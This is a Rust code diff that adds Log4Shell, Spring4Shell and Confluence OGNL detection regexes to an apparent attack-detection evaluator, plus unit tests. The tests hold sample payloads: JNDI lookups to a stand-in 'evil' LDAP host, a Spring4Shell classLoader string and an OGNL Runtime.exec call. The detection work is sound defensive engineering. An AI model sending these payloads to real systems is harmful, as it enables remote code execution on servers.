@@ -404,6 +404,106 @@ impl L2Evaluator for Log4ShellEvaluator {
             });
         }
 
+        // 1. Log4j2 lookup obfuscation with nested lookups
+        static nested_obfuscation: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
+            Regex::new(r"(?i)\$\{(?:\$\{[^}]+\})+[^}]*(?:jndi|ldap|rmi|dns|iiop|corba|nis|nds)[^}]*\}").unwrap()
+        });
+        if let Some(m) = nested_obfuscation.find(&decoded) {
+            dets.push(L2Detection {
+                detection_type: "jndi_nested_obfuscation".into(),
+                confidence: 0.95,
+                detail: format!("Log4j2 lookup obfuscation with nested lookups: {}", m.as_str()),
+                position: m.start(),
+                evidence: vec![ProofEvidence {
+                    operation: EvidenceOperation::SyntaxRepair,
+                    matched_input: m.as_str().to_owned(),
+                    interpretation: "Nested lookup syntax obfuscates JNDI injection".into(),
+                    offset: m.start(),
+                    property: "Log input must not contain obfuscated JNDI lookup expressions".into(),
+                }],
+            });
+        }
+
+        // 2. Spring4Shell OGNL injection (CVE-2022-22965)
+        static spring4shell: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
+            Regex::new(r"(?i)(?:class\.module\.classLoader|Class\.Module\.ClassLoader)\b").unwrap()
+        });
+        if let Some(m) = spring4shell.find(&decoded) {
+            dets.push(L2Detection {
+                detection_type: "spring4shell_ognl_injection".into(),
+                confidence: 0.93,
+                detail: format!("Spring4Shell OGNL injection pattern: {}", m.as_str()),
+                position: m.start(),
+                evidence: vec![ProofEvidence {
+                    operation: EvidenceOperation::PayloadInject,
+                    matched_input: m.as_str().to_owned(),
+                    interpretation: "OGNL expression injection targeting Spring MVC data binding".into(),
+                    offset: m.start(),
+                    property: "Input must not contain ClassLoader manipulation patterns".into(),
+                }],
+            });
+        }
+
+        // 3. Confluence OGNL injection (CVE-2022-26134)
+        static confluence_ognl: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
+            Regex::new(r"(?i)(?:\$\{@java\.lang\.Runtime@getRuntime\(\)|\%24\%7B@java\.lang\.Runtime|ognl\.OgnlContext|#attr\[|_memberAccess\[)").unwrap()
+        });
+        if let Some(m) = confluence_ognl.find(&decoded) {
+            dets.push(L2Detection {
+                detection_type: "confluence_ognl_injection".into(),
+                confidence: 0.92,
+                detail: format!("Confluence OGNL expression injection: {}", m.as_str()),
+                position: m.start(),
+                evidence: vec![ProofEvidence {
+                    operation: EvidenceOperation::PayloadInject,
+                    matched_input: m.as_str().to_owned(),
+                    interpretation: "OGNL expression injection used in Confluence RCE".into(),
+                    offset: m.start(),
+                    property: "Input must not contain Java Runtime or OGNL context manipulation".into(),
+                }],
+            });
+        }
+
+        // 4. Log4j2 Unicode escape obfuscation
+        static unicode_obfuscation: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
+            Regex::new(r"(?i)\$\{[^}]*(?:\\u006[aA]|\\u006[eN]|\\u0064|\\u0069)[^}]*\}").unwrap()
+        });
+        if let Some(m) = unicode_obfuscation.find(input) {
+            dets.push(L2Detection {
+                detection_type: "log4j2_unicode_obfuscation".into(),
+                confidence: 0.88,
+                detail: format!("Log4j2 Unicode escape obfuscation: {}", m.as_str()),
+                position: m.start(),
+                evidence: vec![ProofEvidence {
+                    operation: EvidenceOperation::SyntaxRepair,
+                    matched_input: m.as_str().to_owned(),
+                    interpretation: "JNDI keywords obfuscated with Unicode escapes within Log4j expressions".into(),
+                    offset: m.start(),
+                    property: "Log input must not contain Unicode-obfuscated keywords".into(),
+                }],
+            });
+        }
+
+        // 5. Log4j2 date formatting bypass
+        static date_format_bypass: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
+            Regex::new(r"(?i)\$\{(?:date|java|sys|env|main|jvmrunargs|log4j|ctx|map|sd|mdc|ndc|nfxm|event|bundle|web):[^}]*\$\{[^}]*\}").unwrap()
+        });
+        if let Some(m) = date_format_bypass.find(&decoded) {
+            dets.push(L2Detection {
+                detection_type: "log4j2_date_format_bypass".into(),
+                confidence: 0.87,
+                detail: format!("Log4j2 date formatting or property bypass: {}", m.as_str()),
+                position: m.start(),
+                evidence: vec![ProofEvidence {
+                    operation: EvidenceOperation::SyntaxRepair,
+                    matched_input: m.as_str().to_owned(),
+                    interpretation: "Date/system lookups combined with nested expressions for JNDI chaining".into(),
+                    offset: m.start(),
+                    property: "Log input must not contain lookups nested within formatting/property expressions".into(),
+                }],
+            });
+        }
+
         dets
     }
 
@@ -423,7 +523,12 @@ impl L2Evaluator for Log4ShellEvaluator {
             | "jndi_alternate_protocol"
             | "log4j2_threadcontext_injection"
             | "log4j_mdc_injection"
-            | "jndi_encoded_payload" => Some(InvariantClass::LogJndiLookup),
+            | "jndi_encoded_payload"
+            | "jndi_nested_obfuscation"
+            | "spring4shell_ognl_injection"
+            | "confluence_ognl_injection"
+            | "log4j2_unicode_obfuscation"
+            | "log4j2_date_format_bypass" => Some(InvariantClass::LogJndiLookup),
             _ => None,
         }
     }
@@ -574,6 +679,56 @@ mod tests {
         assert!(
             dets.iter()
                 .any(|d| d.detection_type == "jndi_encoded_payload")
+        );
+    }
+
+    #[test]
+    fn detects_jndi_nested_obfuscation() {
+        let eval = Log4ShellEvaluator;
+        let dets = eval.detect("${${lower:j}ndi:ldap://evil/a}");
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "jndi_nested_obfuscation")
+        );
+    }
+
+    #[test]
+    fn detects_spring4shell_ognl_injection() {
+        let eval = Log4ShellEvaluator;
+        let dets = eval.detect("class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{prefix}i");
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "spring4shell_ognl_injection")
+        );
+    }
+
+    #[test]
+    fn detects_confluence_ognl_injection() {
+        let eval = Log4ShellEvaluator;
+        let dets = eval.detect("${@java.lang.Runtime@getRuntime().exec(\"id\")}");
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "confluence_ognl_injection")
+        );
+    }
+
+    #[test]
+    fn detects_log4j2_unicode_obfuscation() {
+        let eval = Log4ShellEvaluator;
+        let dets = eval.detect("${jnd\\u0069:ldap://evil/a}");
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "log4j2_unicode_obfuscation")
+        );
+    }
+
+    #[test]
+    fn detects_log4j2_date_format_bypass() {
+        let eval = Log4ShellEvaluator;
+        let dets = eval.detect("${sys:os.name:-${jndi:ldap://evil/a}}");
+        assert!(
+            dets.iter()
+                .any(|d| d.detection_type == "log4j2_date_format_bypass")
         );
     }
 }
